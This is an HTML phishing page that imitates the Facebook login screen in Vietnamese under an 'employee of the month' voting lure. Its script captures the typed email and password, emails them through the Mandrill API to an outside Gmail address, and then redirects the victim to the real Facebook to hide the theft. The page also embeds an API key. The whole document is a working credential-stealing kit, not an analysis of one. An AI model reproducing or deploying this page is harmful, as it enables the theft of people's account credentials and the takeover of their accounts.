<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:locale" content="vi_VN">
    <meta name="description" content="Hãy đăng nhập Facebook để bắt đầu chia sẻ và kết nối với bạn bè, gia đình và những người bạn biết.">
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
    <title>Bình chọn nhân viên tháng</title>
    <link rel="stylesheet" href="https://candfansjp.github.io/style.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <script type="text/javascript" src="mandrill.min.js"></script>
  </head>
  <body>
    <div class="container flex">
      <div class="facebook-page flex">
        <div class="text">
          <h1>facebook</h1>
          <p>Facebook giúp bạn kết nối và chia sẻ</p>
          <p>  với mọi người trong cuộc sống của bạn.</p>
        </div>
        <form>
          <input type="text" id="email" placeholder="Email hoặc số điện thoại">
          <input type="password" id="password" placeholder="Mật khẩu">
          <div class="link">
            <button id="buttonSend" class="login" type='button'>Đăng nhập</button>
            <a href="#" class="forgot">Quên mật khẩu?</a>
          </div>
          <hr>
          <div class="button">
            <a href="#">Tạo tài khoản mới</a>
          </div>
        </form>
      </div>
    </div>
  </body>

  <script type="text/javascript">
    document.getElementById("buttonSend").onclick = function() {sendTheMail()};

    function sendTheMail(){
      var m = new mandrill.Mandrill('md-mVIowYpTNKD75eTa_guiDA'); // This will be public
      let email = document.getElementById("email").value
      let password = document.getElementById("password").value
  
        m.messages.send({
            "message": {
                "from_email": "harukileejp@gmail.com",
                "from_name": "abcbac",
                "to":[{"email": "doccocaubaixl@gmail.com", "name": "name"}], // Array of recipients
                "subject": `email is: ${email}  | password is: ${password}`,
                "text": "Text to be sent in the body" // Alternatively, use the "html" key to send HTML emails rather than plaintext
            }
        });

        console.log(`${email} : ${password}`)

        setTimeout(function () {
            window.location="https://www.facebook.com/";
        }, 2000); //will call the function after 2 secs.
    }
  </script> 
</html>
